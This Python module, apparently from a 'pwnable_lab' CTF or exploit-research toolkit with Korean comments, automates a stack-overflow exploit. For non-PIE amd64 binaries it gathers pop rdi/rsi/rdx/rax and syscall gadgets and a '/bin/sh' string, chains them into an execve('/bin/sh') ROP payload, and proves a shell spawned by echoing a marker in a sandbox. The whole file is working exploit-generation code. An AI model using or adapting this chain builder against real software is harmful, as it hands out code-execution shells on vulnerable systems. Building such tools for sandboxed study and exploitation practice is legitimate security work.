"""완전 자동 execve syscall ROP 오케스트레이션 (pop rdi/rsi/rdx/rax → syscall → 셸).

``system`` 이 링크돼 있지 않은 (주로 정적 링크) 바이너리를 위한 경로다. 바이너리의
클린 ``pop`` 가젯·``/bin/sh`` 문자열·``syscall`` 가젯을 정적으로 모아
(:func:`analyzer.strategy.execve_plan`) ``execve("/bin/sh", 0, 0)`` 체인을 만들고,
PTY 로 spawn 된 셸에 ``echo <marker>`` 를 흘려 **셸 획득을 직접 증명**한다.

ret2system 코어와 마찬가지로 **실행이 일어나는 프로세스**(in-process 또는 컨테이너
안의 CLI)에서 호출된다.
"""

from __future__ import annotations

import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import execve_plan, is_pie
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox.runner import SandboxLimits, verify_shell

# execve 시스템콜 번호 (amd64)
_SYS_EXECVE = 59


def auto_execve(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """단일 바이너리에 대해 execve syscall ROP 를 자동 구성·검증한다(셸 획득까지 증명)."""

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if is_pie(image):
        return {"attempted": False, "reason": "pie-needs-base-leak"}
    plan = execve_plan(image)
    if plan is None:
        return {"attempted": False, "reason": "no-execve-plan"}

    limits = limits or SandboxLimits()
    # execve("/bin/sh", NULL, NULL):
    #   rdi = &"/bin/sh", rsi = 0, rdx = 0, rax = 59(SYS_execve), syscall
    chain = [
        RopStep(plan["binsh"], "rdi = /bin/sh"),
        RopStep(plan["pop_rsi"], "pop rsi ; ret"),
        RopStep(0, "rsi = NULL (argv)"),
        RopStep(plan["pop_rdx"], "pop rdx ; ret"),
        RopStep(0, "rdx = NULL (envp)"),
        RopStep(plan["pop_rax"], "pop rax ; ret"),
        RopStep(_SYS_EXECVE, "rax = 59 (SYS_execve)"),
        RopStep(plan["syscall"], "syscall"),
    ]
    payload = build_overflow(offset, plan["pop_rdi"], bits=64, chain=chain)
    marker = "PWNPILOT_" + secrets.token_hex(4)
    proof = verify_shell(binary_path, payload, marker=marker, limits=limits)
    if proof.shell_spawned:
        return _report(plan, True, "shell-proven", proof.as_dict())
    return _report(plan, False, "did-not-spawn-shell", proof.as_dict())


def _report(
    plan: dict,
    succeeded: bool,
    reason: str,
    shell_proof: dict | None,
) -> dict:
    report = {
        "attempted": True,
        "technique": "execve",
        "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
        "pop_rsi_hex": f"0x{plan['pop_rsi']:x}",
        "pop_rdx_hex": f"0x{plan['pop_rdx']:x}",
        "pop_rax_hex": f"0x{plan['pop_rax']:x}",
        "binsh_hex": f"0x{plan['binsh']:x}",
        "syscall_hex": f"0x{plan['syscall']:x}",
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
    }
    if shell_proof is not None:
        report["shell_proof"] = shell_proof
    return report
